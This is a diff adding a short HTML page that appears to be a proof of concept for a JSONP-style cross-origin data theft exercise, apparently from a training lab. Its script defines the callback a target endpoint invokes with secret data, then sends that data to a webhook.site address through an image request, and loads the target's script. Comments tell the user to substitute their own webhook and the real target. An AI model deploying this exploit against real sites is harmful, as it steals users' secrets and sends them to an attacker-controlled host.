@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+  <body>
+    <script>
+      // The target returns: display({"secret":"1"});
+      function display(data) {
+        // Replace with your webhook URL
+        new Image().src = "https://webhook.site/ba5efee3-8cda-43d7-9f73-bc7d513df8ea" +
+          encodeURIComponent(JSON.stringify(data));
+      }
+    </script>
+
+    <!-- Replace with the real target endpoint that returns: display({...}); -->
+    <script src="http://ptl-912e00fc-b9f4bca0.libcurl.so/secrets.js"></script>
+  </body>
+</html>
